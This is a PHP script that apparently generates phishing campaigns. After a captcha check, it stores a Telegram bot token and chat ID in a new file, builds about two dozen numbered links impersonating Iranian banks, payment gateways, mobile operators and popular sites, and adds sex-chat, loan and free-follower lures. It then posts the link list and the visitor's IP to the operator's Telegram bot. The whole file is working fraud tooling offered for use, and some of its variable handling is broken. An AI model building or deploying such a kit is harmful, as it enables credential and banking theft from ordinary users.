<?php
include"INFO.php";
//ANTY SPAME
if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}

$Code=$_POST["code"];
$cheack = file_get_contents("captcha/code.txt");
 if ($Code==$cheack){
$T=file_get_contents("captcha/token.txt");
$IDS2=file_get_contents("captcha/id.txt");





file_put_contents("ID.txt",$IDS2);
 
$IP=$_SERVER["REMOTE_ADDR"];
$Domain=$_SERVER["HTTP_HOST"];
$O=rand(1000,9000);
if(!file_exists("data")){mkdir("data");}
$xkiler = fopen("data/$O.php", 'w') or die("Kos Nanat!");
fwrite($xkiler, "<?php\n");
fwrite($xkiler, "$");
fwrite($xkiler, "TOKEN='$T';\n");
fwrite($xkiler, "$");
fwrite($xkiler, "ID= $IDS2;\n");
fwrite($xkiler, "?>");


$Asan="$url/Asan/?e=$O";
$Live="$url/Live/?e=$O";
$Sighe="$url/Sighe/?e=$O";
$Irancell="$url/Irancell/?e=$O";
$Dostyabi="$url/Dostyabi/?e=$O";
$Masaj="$url/Masaj/?e=$O"; 
$Mobo="$url/Mobo/?e=$O";
$Charge="$url/Charge/?e=$O" ;
$Vam="$url/Vam/?e=$O";
$Mci="$url/Mci/?e=$O" ;
$Chat="$url/Chat/?e=$O";
$net6="$url/Net/?e=$O";
$Internet="$url/Internet/?e=$O" ;
$Hamta="$url/Hamta/?e=$O" ;
$Kheyrieh="$url/Kheyrieh/?e=$O" ;
$Internetmeli="$url/Internetmeli/?e=$O" ;
$Saham="$url/Saham/?e=$O" ;
$Freefolower="$url/Freefolower/?e=$O";
$Mellat= "$url/Mellat/?e=$O" ;
$Folower="$url/Folower/?e=$O";
$Filimo="$url/Filimo/?e=$O";
$Divar="$url/Divar/?e=$O" ;
$sheypoor="$url/sheypoor/?e=$O" ;
$book="$url/book/?e=$O" ;


        $Text="
        
╔═══[Asan]════╣⫸
║ $Asan
╠═══[Mellat]══╣⫸
║ $Mellat
╠═══[Charge]══╣⫸
║ $Charge
╠════[Net]════╣⫸
║ $net6
╠════[Vam]════╣⫸
║ $Vam
╠════[Mci]════╣⫸
║ $Mci
╠══[Sex Chat]═╣⫸
║ $Chat
╠═[Live sexi]═╣⫸
║ $Live
╠═══[Sighe]═══╣⫸
║ $Sighe
╠═[Iranccel]══╣⫸
║ $Irancell
╠══[Netnew]═══╣⫸
║ $Internet
╠═══[Mobo]════╣⫸
║ $Mobo
╠═══[Help]════╣⫸
║ $Kheyrieh
╠═══[Hamta]═══╣⫸
║ $Hamta
╠══[Netmeli]══╣⫸
║ $Internetmeli
╠═══[Saham]═══╣⫸
║ $Saham
╠══[Folower]══╣⫸
║ $Folower
╠═══[Filimo]══╣⫸ 
║ $Filimo
╠═══[Divar]═══╣⫸
║ $Divar
╠═══[Insta]═══╣⫸
║ $Freefolower
╠═══[Masaj]═══╣⫸
║ $Masaj
╠══[sheypoor]═╣⫸
║ $sheypoor
╠═══[book]════╣⫸
║ $book
╠═[Your IP]╣⫸
╟ 🌐𝙸𝙿 <code>$IP</code>
╠══[Link]══╣⫸
║ $url
╠══[Port]══╣⫸
╟ 🔢YOR  CODE <code>$O</code>
╠═══[Creator]═══╣⫸
╟ ✨Cʀᴇᴀᴛᴇᴅ Bʏ : @fuckingdargah
║ 🌐Webhosting : @XTuranli
╚══════  [𝙶𝚘𝚘𝚍 𝚕𝚞𝚌𝚔!] ════╣⫸
";
        

        $report =  file_get_contents("https://api.telegram.org/bot".$T."/SendMessage?chat_id=".$IDS2."&disable_web_page_preview=true&parse_mode=HTML&text=".urlencode($Text));

$chat= file_get_contents("ID.txt");
$yo="your chat id: " ;
function getrobotinfo()
    {
        $robotinfo = 'https://api.telegram.org/bot'.$T.'/getMe';
        return file_get_contents($robotinfo) ;
    }
$robotinfo = json_decode(getrobotinfo());
$botuserid = $robotinfo->result->username;
header("location: https://t.me/$botuserid");
}else{
	$text = " ❌ کد امنیتی صحیح نبود و به همین دلیل درگاه شما ساخته نشد!❌
$url";
file_get_contents("https://api.telegram.org/bot".$T."/SendMessage?chat_id=".$IDS2."&disable_web_page_preview=true&parse_mode=HTML&text=".urlencode($Text));
header("location: https://t.me/$botuserid");
};
	?>
